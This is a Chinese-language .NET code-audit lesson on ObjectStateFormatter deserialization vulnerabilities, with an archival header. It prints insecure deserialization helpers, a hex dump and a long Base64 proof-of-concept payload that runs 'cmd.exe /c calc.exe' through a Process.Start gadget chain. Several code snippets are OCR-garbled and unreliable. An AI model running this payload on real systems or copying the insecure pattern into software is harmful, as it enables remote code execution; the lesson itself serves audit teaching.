<!--
Source: G:\tmp\安全项目研究\.netskill\.NET高级代码审计（第十课） ObjectStateFormatter反序列化漏洞.pdf-3fcc7a67-c7e6-42f3-a7d5-9f8c1eb54f77\full.md
Archived as: ObjectStateFormatter raw lesson material
Purpose: provenance-only reference for authorized .NET code audit skill development.
Do not load by default; prefer structured references unless exact source context is needed.
-->
.NET 高级代码审计（第十课） ObjectStateFormatter 反序列化漏洞

Ivan1ee@360 天眼云影实验室

2019 年 03 月 01 日

# 0x00 前言

ObjectStateFormatter 一般用于序列化和反序列化状态对象图，如常用的 ViewState就是通过这个类做序列化的，位于命名空间 System.Web.UI，优点在于对基础类型存储在 pair、Hashtable 等数据结构里的时候序列化速度很快。但是使用反序列化不受信任的二进制文件会导致反序列化漏洞从而实现远程 RCE 攻击，本文笔者从原理和代码审计的视角做了相关介绍和复现。

# 0x01 ObjectStateFormatter 序列化

下面通过使用 ObjectStateFormatter 类序列化一个实例来说明问题，首先定义

TestClass 对象

[Serializable]   
public class TestClass{ private string classname; private string name; private int age; public string classname { get $\Rightarrow$ classname; set $\Rightarrow$ classname $=$ value;} public string Name { get $\Rightarrow$ name; set $\Rightarrow$ name $=$ value;} public int Age { get $\Rightarrow$ age; set $\Rightarrow$ age $=$ value;} public override stringToString() { return base.ToString(); } public static void ClassMethod( string value) { Process.Start(value); }

定义了三个成员，并实现了一个静态方法ClassMethod启动进程。 序列化通过创建对象实例分别给成员赋值

```txt
TestClass testClass = new TestClass();
testClass.Age = 18;
testClass.Name = "Ivanlee";
testClass.Classname = "360";
FileStream stream = new FileStream(@"d:\ObjectState.dat", FileMode.Create);
ObjectStateExceptionFormatter bFormat = new ObjectStateExceptionFormatter();
bFormat SZerlize(stream, testClass);
stream.Close(); 
```

同 BinaryFormatter 一样，常规下使用 Serialize 得到序列化后的二进制文件内容

![](images/1276d15dd784b24d45be99c1b6863d8e44135d88e700da7cd5d8998730cf964b.jpg)

# 0x02 ObjectStateFormatter 反序列化

# 2.1、反序列化用法

反序列过程是将二进制数据转换为对象，通过创建一个新对象的方式调用 Deserialize方法实现的 ，查看 ObjectStateFormatter 格式化器定义一样实现了 IFormatter 接口

![](images/544980c86f4d42872a47c88149ca95bfdaed668885fa61abe0fc2ade848c6818.jpg)

笔者通过创建新对象的方式调用 Deserialize 方法实现的具体实现代码可参考以下

```javascript
FileStream stream2 = new FileInputStream(@"d:\ObjectState.dat", FileMode.Open); ObjectStateFormatter bFormat2 = new ObjectStateFormatter(); var person = bFormat2.Deserialization(stream2); MessageBox.Show((TestClass.person).Name); stream2.Close(); 
```

反序列化后得到 TestClass 类的成员 Name 的值。

![](images/2cfcd538c83c78892259bca210f847f744b235271a3f63d59cfa4a4c06066941.jpg)

# 2.2、攻击向量—ActivitySurrogateSelector

由于上一篇中已经介绍了漏洞的原理，所以本篇就不再冗余的叙述，没有看的朋友请参考《.NET 高级代码审计（第八课） SoapFormatter 反序列化漏洞》，不同之处是用了ObjectStateFormatter 类序列化数据，同样也是通过重写 ISerializationSurrogate 调用自定义代码，笔者这里依旧用计算器做演示，生成的二进制文件打开后如下图

<table><tr><td>启动</td><td colspan="3">Binary.dat</td><td colspan="3">Binary1.dat</td><td colspan="3">b-w.txt</td><td colspan="3">ObjectState.dat</td><td colspan="3">ObjectStatel.dat</td><td></td></tr><tr><td colspan="16">编辑为:十六进制00 运行脚本 运行模板</td><td></td></tr><tr><td></td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>F</td></tr><tr><td>77F0h:</td><td>74</td><td>00</td><td>4F</td><td>70</td><td>65</td><td>6E</td><td>53</td><td>74</td><td>61</td><td>6E</td><td>64</td><td>61</td><td>72</td><td>64</td><td>4F</td><td>75</td></tr><tr><td>7800h:</td><td>74</td><td>70</td><td>75</td><td>74</td><td>00</td><td>4D</td><td>6F</td><td>76</td><td>65</td><td>4E</td><td>65</td><td>78</td><td>74</td><td>00</td><td>53</td><td>79</td></tr><tr><td>7810h:</td><td>73</td><td>74</td><td>65</td><td>6D</td><td>2E</td><td>54</td><td>65</td><td>78</td><td>74</td><td>00</td><td>52</td><td>65</td><td>61</td><td>64</td><td>41</td><td>6C</td></tr><tr><td>7820h:</td><td>6C</td><td>54</td><td>65</td><td>78</td><td>74</td><td>00</td><td>67</td><td>65</td><td>74</td><td>5F</td><td>45</td><td>72</td><td>72</td><td>6F</td><td>72</td><td>54</td></tr><tr><td>7830h:</td><td>65</td><td>78</td><td>74</td><td>00</td><td>53</td><td>74</td><td>72</td><td>65</td><td>61</td><td>6D</td><td>69</td><td>6E</td><td>67</td><td>43</td><td>6F</td><td>6E</td></tr><tr><td>7840h:</td><td>74</td><td>65</td><td>78</td><td>74</td><td>00</td><td>63</td><td>6F</td><td>6E</td><td>74</td><td>65</td><td>78</td><td>74</td><td>00</td><td>76</td><td>00</td><td>78</td></tr><tr><td>7850h:</td><td>00</td><td>54</td><td>6F</td><td>41</td><td>72</td><td>72</td><td>61</td><td>79</td><td>00</td><td>53</td><td>79</td><td>73</td><td>74</td><td>65</td><td>6D</td><td>2E</td></tr><tr><td>7860h:</td><td>53</td><td>65</td><td>63</td><td>75</td><td>72</td><td>69</td><td>74</td><td>79</td><td>2E</td><td>50</td><td>6F</td><td>6C</td><td>69</td><td>63</td><td>79</td><td>00</td></tr><tr><td>7870h:</td><td>67</td><td>65</td><td>74</td><td>5F</td><td>41</td><td>73</td><td>73</td><td>65</td><td>6D</td><td>62</td><td>6C</td><td>79</td><td>00</td><td>67</td><td>65</td><td>74</td></tr><tr><td>7880h:</td><td>5F</td><td>50</td><td>61</td><td>74</td><td>68</td><td>54</td><td>6F</td><td>41</td><td>73</td><td>73</td><td>65</td><td>6D</td><td>62</td><td>6C</td><td>79</td><td>00</td></tr><tr><td>7890h:</td><td>53</td><td>65</td><td>6C</td><td>65</td><td>63</td><td>74</td><td>4D</td><td>61</td><td>6E</td><td>79</td><td>00</td><td>53</td><td>79</td><td>73</td><td>74</td><td>65</td></tr><tr><td>78A0h:</td><td>6D</td><td>2E</td><td>52</td><td>75</td><td>6E</td><td>74</td><td>69</td><td>6D</td><td>65</td><td>2E</td><td>53</td><td>65</td><td>72</td><td>69</td><td>61</td><td>6C</td></tr><tr><td>78B0h:</td><td>69</td><td>7A</td><td>61</td><td>74</td><td>69</td><td>6F</td><td>6E</td><td>2E</td><td>46</td><td>6F</td><td>72</td><td>6D</td><td>61</td><td>74</td><td>74</td><td>65</td></tr><tr><td>78C0h:</td><td>72</td><td>73</td><td>2E</td><td>42</td><td>69</td><td>6E</td><td>61</td><td>72</td><td>79</td><td>00</td><td>49</td><td>44</td><td>69</td><td>63</td><td>74</td><td>69</td></tr><tr><td>78D0h:</td><td>6F</td><td>6E</td><td>61</td><td>72</td><td>79</td><td>00</td><td>53</td><td>74</td><td>72</td><td>69</td><td>6E</td><td>67</td><td>44</td><td>69</td><td>63</td><td>74</td></tr><tr><td>78E0h:</td><td>69</td><td>6F</td><td>6E</td><td>61</td><td>72</td><td>79</td><td>00</td><td>6F</td><td>70</td><td>5F</td><td>45</td><td>71</td><td>75</td><td>61</td><td>6C</td><td>69</td></tr><tr><td>78F0h:</td><td>74</td><td>79</td><td>00</td><td>6F</td><td>70</td><td>5F</td><td>49</td><td>6E</td><td>65</td><td>71</td><td>75</td><td>61</td><td>6C</td><td>69</td><td>74</td><td>79</td></tr><tr><td>7900h:</td><td>00</td><td>53</td><td>79</td><td>73</td><td>74</td><td>65</td><td>6D</td><td>2E</td><td>53</td><td>65</td><td>63</td><td>75</td><td>72</td><td>69</td><td>74</td><td>79</td></tr><tr><td>7910h:</td><td>00</td><td>57</td><td>69</td><td>6E</td><td>64</td><td>6F</td><td>77</td><td>73</td><td>49</td><td>64</td><td>65</td><td>6E</td><td>74</td><td>69</td><td>74</td><td>79</td></tr><tr><td>7920h:</td><td>00</td><td>49</td><td>73</td><td>4E</td><td>75</td><td>6C</td><td>6C</td><td>4F</td><td>72</td><td>45</td><td>6D</td><td>70</td><td>74</td><td>79</td><td>00</td><td>00</td></tr><tr><td>7930h:</td><td>00</td><td>0F</td><td>63</td><td>00</td><td>6D</td><td>00</td><td>64</td><td>00</td><td>2E</td><td>00</td><td>65</td><td>00</td><td>78</td><td>00</td><td>65</td><td>00</td></tr><tr><td>7940h:</td><td>00</td><td>17</td><td>2F</td><td>00</td><td>63</td><td>00</td><td>20</td><td>00</td><td>53</td><td>00</td><td>61</td><td>00</td><td>6C</td><td>00</td><td>63</td><td>00</td></tr><tr><td>7950h:</td><td>2E</td><td>00</td><td>65</td><td>00</td><td>78</td><td>00</td><td>65</td><td>00</td><td>00</td><td>01</td><td>00</td><td>13</td><td>70</td><td>00</td><td>7C</td><td>00</td></tr><tr><td>7960h:</td><td>70</td><td>00</td><td>6C</td><td>00</td><td>75</td><td>00</td><td>67</td><td>00</td><td>69</td><td>00</td><td>6E</td><td>00</td><td>3D</td><td>00</td><td>00</td><td>2B</td></tr><tr><td>7970h:</td><td>74</td><td>00</td><td>68</td><td>00</td><td>65</td><td>00</td><td>20</td><td>00</td><td>70</td><td>00</td><td>6C</td><td>00</td><td>75</td><td>00</td><td>67</td><td>00</td></tr></table>

按照惯例用 ObjectStateFormatter 类的 Deserialize 方法反序列化

```javascript
FileStream stream2 = new FileInputStream(@"d:\ObjectState.dat", FileMode.Open); ObjectStateFormatter bFormat2 = new ObjectStateFormatter(); var person = bFormat2.Deserialization(stream2); MessageBox.Show (((TestClass)person).Name); stream2.Close(); 
```

最后反序列化成功后弹出计算器，但同样也抛出了异常，这在 WEB 服务情况下会返回500 错误。

![](images/bb731a85e6a57642ecfeb583778a2e698d7df6c55370463ae72af33f42606047.jpg)

# 2.3、攻击向量—PSObject

由于笔者的 windows 主机打过了 CVE-2017-8565（Windows PowerShell 远程代码执行漏洞）的补丁，利用不成功，所以在这里不做深入探讨，有兴趣的朋友可以自行研究。有关于补丁的详细信息参考：

https://support.microsoft.com/zh-cn/help/4025872/windows-powershellremote-code-execution-vulnerability

# 0x03 代码审计视角

# 3.1、Deserialize

从代码审计的角度找到漏洞的 EntryPoint，Deserialize 有两个重载分别可反序列化Stream 和字符串数据，其中字符串可以是原始的 Raw 也可以是文档中说的 Base64 字符串，两者在实际的反序列化都可以成功。

![](images/69040b8551a3053d6d2c63a741bb76d568a5628a9e01fdbd6c7c1dd1e560cf74.jpg)

下面是不安全的代码：

public class ObjectStateHelper   
{ public static object Deserialization(string path) { FileStream fs $=$ File.Open(path,FileMode.Open); ObjectStateFormatter binaryFormatter $=$ new ObjectStateFormatter(); var objects $=$ binaryFormatter.Deserialization(fs); fs.Close(); return objects; }

攻击者只需要控制传入字符串参数 path 便可轻松实现反序列化漏洞攻击。

也可以使用下面的这段不安全代码触发漏洞：

public static object Deserialization(string path)   
{ ObjectStateFormatter binaryFormatter $=$ new ObjectStateFormatter(); var objects $=$ binaryFormatter.Deserialization(path); return objects;

# 请求 Base64 的 Poc 可成功触发弹出计算器

```txt
/wEyxBEAAQAAAP///8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2Ivbj00Lj AuMC4wLCBDdWx0dXJIPW5IdXRyYWwsIFB1YmxpY0tleVRva2VuPW13N2E1YZU2 MTkzNGUwODkFAQAAAAIQBU3IzdGVtLkNvbGxIY3Rpb25zLkdIbmVyaWMuU29y dGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcslIG1zY29ybGLiLCBWZXJzaW9uPTQuM C4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTY xOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcdgWZXJzaW9uBUIOZW1zAA MABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5IcmljLkNvbXBhcmIzb25Db21 wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2Ivbj00LjaMuM C4wLCBDdWx0dXJIPW5IdXRyYWwsIFB1YmxpY0tleVRva2VuPW13N2E1YZU2MTk zNGUwODldXQgCAAAAAGAAAAkDAAAAAAGAAAABAMAAACNAVIN5c3 RlbS5Db2xsZWN0aW9ucy5HZW5IcmljLkNvbXBhcmIzb25Db21wYXJlcmAxW1tTe XN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2Ivbj00LjaMuMC4wLCBDdWx0dX JIPW5IdXRyYWwsIFB1YmxpY0tleVRva2VuPW13N2E1YZU2MTkzNGUwODldXQEA AAALX2NvbXBhcmlzb24DIIN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGI6YXRpb25Ib2xzkZ XIJBQQAAABEEAAAAAgAAAAYGAAAACCy9jIGNnhbGMuZXhlBgcAAAADY21kBAUA AAAAiU3IzdGVtLkRlbGVnYXRIU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWd hdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGI 6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZ W1izXXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5 NZW1izXXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAAJCGAAAAQI AAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGI6YXRpb25Ib2xkZXIrRGVsZWdhdGV FbnRyeQcAAAAEdHlwZQhhc3NIbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtY mx5DnRhcmdldFR5cGVOYW1ICm1IldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEB AgEBAQMwU3IzdGVtLkRlbGVnYXRIU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0 ZUVudHJ5BgssAAACwAIN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcisIG1zY2 9ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGI js2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcisIG1zY2 
```

9ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGl jS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy 5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV 0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEtt c2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1Ym xpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJz aW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49 Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZX NzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lb WJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5T mFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRB HZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0A AAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KF N5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA%2BU3lzdGVtLkRpYW dub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0c mluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADV N5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsI FN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVt LlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3 RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJza W9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Y jc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=

![](images/28ed7ea6bed6fec7b784f566f5344cd7edae07c9e63a0c9fafbdfb29079158eb.jpg)

![](images/9f145256a1206af713418dc3b5dcd6c6f83bf78afc458ada0d1c5679e35da706.jpg)

最后附上动图效果图

![](images/603f1040e3e96d988650911bbbc203b7d6e9df051de09d2ca41bb1fa072989d2.jpg)

# 0x04 总结

实际开发中 ObjectStateFormatter 通常用在处理 ViewState 状态视图，虽说用的频率并不高，但一旦未注意到数据反序列化安全处理，就会产生反序列化漏洞。最后.NET反序列化系列课程笔者会同步到 https://github.com/Ivan1ee/ 、

https://ivan1ee.gitbook.io/ ，后续笔者将陆续推出高质量的.NET 反序列化漏洞文章，欢迎大伙持续关注，交流，更多的.NET 安全和技巧可关注实验室公众号。
